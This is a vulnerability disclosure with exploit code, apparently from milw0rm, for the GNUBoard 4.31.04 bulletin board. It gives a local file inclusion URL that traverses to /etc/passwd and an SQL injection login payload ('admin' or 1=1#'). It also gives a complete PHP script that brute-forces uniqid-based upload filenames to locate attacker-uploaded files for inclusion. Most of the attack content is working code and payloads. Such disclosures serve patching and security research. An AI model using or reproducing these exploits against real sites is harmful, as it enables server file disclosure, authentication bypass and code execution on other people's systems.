<html><head><title>GNUBoard 4.31.04 (09.01.30) Multiple Local/Remote 	Vulnerabilities</title></head><pre>GNUBoard V4.31.04 (09.01.30) Multiple Local/Remote Vulnerability
bY make0day@gmail.com

/*************************

SIR GNUBoard (VERSION 4.31.04 (09.01.30))is a widely used bulletin board system of Korea.
It is freely available for all platforms that supports PHP and MySQL.
But we find a file include vulnerability affects SIR GNUBoard.
In special conditions,it may be used as a remote file include vulnerability .
This issue  to  execute arbitrary  PHP code on an affected computer with the privileges of the affected Web server.
Here is the details:

**************************/
TEST ON VERSION 4.31.04 (08.01.30)

/***************************
Local File Inclusion Vulnerability

/poll_result.php

include_once(&quot;./_common.php&quot;);

$po = sql_fetch(&quot; select * from $g4[poll_table] where po_id = '$po_id' &quot;);
if (!$po[po_id]) 

¡Š¡Š

echo &quot;&lt;script language='javascript' src='$g4[path]/js/sideview.js'&gt;&lt;/script&gt;&quot;;

if (!$skin_dir) $skin_dir = &quot;basic&quot;;
$poll_skin_path = &quot;$g4[path]/skin/poll/$skin_dir&quot;;
include_once (&quot;$poll_skin_path/poll_result.skin.php&quot;);	//file include

*************************/

poc:
http://test.com/GnuBoard/bbs/poll_result.php?po_id=177&amp;skin_dir=../../../../../../../../etc/passwd%00

/***************************
SQL Injection Vulnerability

/register_form.skin.php

&lt;?
if (!defined(&quot;_GNUBOARD_&quot;)) exit;
?&gt;

&lt;style type=&quot;text/css&quot;&gt;
&lt;!--

¡Š¡Š

function fregisterform_submit(f) 
{
    if (f.w.value == &quot;&quot;) {

        reg_mb_id_check();

        if ($F('mb_id_enabled')!='000') {	
            alert('Èž¿øŸÆÀÌµðžŠ ÀÔ·ÂÇÏÁö ŸÊŸÒ°Å³ª ÀÔ·Â¿¡ ¿À·ù°¡ ÀÖœÀŽÏŽÙ.');
            $('reg_mb_id').activate();
            return false;
        }
    }
	//WTF javascript~!!, We can inject sql query at mb_id, It wasn`t addslushed

/point.php
&lt;?
include_once(&quot;./_common.php&quot;);

¡Š¡Š

$sql_common = &quot; from $g4[point_table] where mb_id = '$member[mb_id]' &quot;; //mb_id

¡Š¡Š

                $sql = &quot; select * 
                          $sql_common
                          $sql_order
                          limit $from_record, $rows &quot;;

*************************/

poc:
mb_id = admin' or 1=1#

/***************************
File name disclosure Vulnerability

/register_form_update.php

&lt;?
$g4[title] = $wr_subject . &quot;±ÛÀÔ·Â&quot;;
include_once(&quot;./_common.php&quot;);

@include_once(&quot;$board_skin_path/write_update.head.skin.php&quot;);

¡Š¡Š

$filename = preg_replace(&quot;/\.(php|phtm|htm|cgi|pl|exe|jsp|asp|inc)/i&quot;, &quot;$0-x&quot;, $filename);
$upload[$i][file] = abs(ip2long($_SERVER[REMOTE_ADDR])).'_'.substr(md5(uniqid($g4[server_time])),0,8).'_'.str_replace('%', '', urlencode($filename)); 
//Key point
$dest_file = &quot;$g4[path]/data/file/$bo_table/&quot; . $upload[$i][file];


1) uniqid is just unix time stamp + usec(micro time),
2) yeah, We can brute force usec in 0 ~ 0x100000 range
3) Also, We can upload two files when write a post,
4) By uploading image file, we can get encoded file name ex) http://test.com/GnuBoard/data/file/happy/747682804_462b38f4_1.jpg
5) By uploading txt file, we can get exact time (y/m/d/h/m/s) ex) DATE : 2009-01-30 08:35:49
-&gt; As a result, We can use arbitrary file for Local file inclusion 

*************************/

poc:

/MicrosecBrute.php

&lt;html&gt;
&lt;head&gt;
&lt;title&gt;test&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;xmp&gt;

&lt;?
////////////////////////////////////////////////////////////////////////////////
//http://test.com/GnuBoard/data/file/happy/747682804_462b38f4_1.jpg

$t_host = &quot;test.com&quot;;	//target host
$t_dir = &quot;/GnuBoard/data/file/happy/&quot;; //upload directory
$encodedimgname = &quot;747682804_462b38f4_1.jpg&quot;;	//Encoded Image file name
$imgname = &quot;1.jpg&quot;;	//Upload img file name
$fname = &quot;test.txt&quot;;	//Upload wanted file name
$year = &quot;2009&quot;;	//file upload time 2009-01-30 08:35:49
$mon = &quot;01&quot;;
$day = &quot;30&quot;;
$hour = &quot;08&quot;;
$min = &quot;35&quot;;
$sec = &quot;49&quot;;
$ip = $_SERVER[REMOTE_ADDR];	//Attacker IP
/////////////////////////////////////////////////////////////////////////////////

$longip = abs(ip2long($ip));
$encfname = urlencode($fname);
$encimgname = urlencode($imgname);
$time = mktime ($hour, $min, $sec, $mon, $day, $year); 
$prefix = $time;
$_date = date (&quot;Y m j g i a s&quot;, $time);

echo &quot;IP : $ip\n&quot;;
echo &quot;Wanted File : $encfname\n&quot;;
echo &quot;Img File : $encimgname\n&quot;;
echo &quot;time : $_date\n&quot;;
echo &quot;dir : &quot;.$t_host.$t_dir.&quot;\n&quot;;

ob_flush();
flush();
?&gt;

&lt;?
for($i = 0; $i &lt; 0x100000; $i++)	//Find img upload time
{
	$uniq_id = sprintf(&quot;%s%08x%05x&quot;,$prefix,$time,$i);
	$fullname = $longip.'_'.substr(md5($uniq_id),0,8).'_'.$encimgname;

	if(stristr($fullname,$encodedimgname))
	{
		$img_time = $i;
		break;
	}

}

echo &quot;Image file upload usec : $img_time\n&quot;;
ob_flush();
flush();

?&gt;
&lt;?

for($i = $img_time; $i &lt; 0x100000; $i++)	//Find wanted upload time
{
	$uniq_id = sprintf(&quot;%s%08x%05x&quot;,$prefix,$time,$i);
	$fullname = $longip.'_'.substr(md5($uniq_id),0,8).'_'.$encfname;
	
	$ret = myGet($t_host, $t_dir.$fullname);	

	if(stristr($ret,&quot;200 OK&quot;))
	{
		echo &quot;200 OK :) URL : http://&quot;.$t_host.$t_dir.$fullname.&quot;\n&quot;;
		exit();
	}


}

echo &quot;404 Not Found :(\n&quot;;


 function myGet($host, $target, $port = 80)
 {

  $request  = &quot;HEAD $target HTTP/1.1\r\n&quot;;
  $request .= &quot;Host: $host\r\n&quot;;
  $request .= &quot;User-Agent: Mozilla/4.0\r\n&quot;;
  $request .= &quot;Accept: text/html\r\n&quot;;
  $request .= &quot;Connection: close\r\n&quot;;
  $request .= &quot;\r\n&quot;;

  $socket  = fsockopen($host, $port, $errno, $errstr, 100);
  fputs($socket, $request);
  $ret = &quot;&quot;;
  while(!feof($socket))
   $ret .= fgets( $socket, 4096 );

  fclose( $socket );

  return $ret;
 }

?&gt;
&lt;/xmp&gt;
&lt;/body&gt;
&lt;/html&gt;

*************************/
Result : http://test.com/GnuBoard/data/file/happy/747682804_d57d84be_test.txt 

# milw0rm.com [2009-01-30]</pre></html>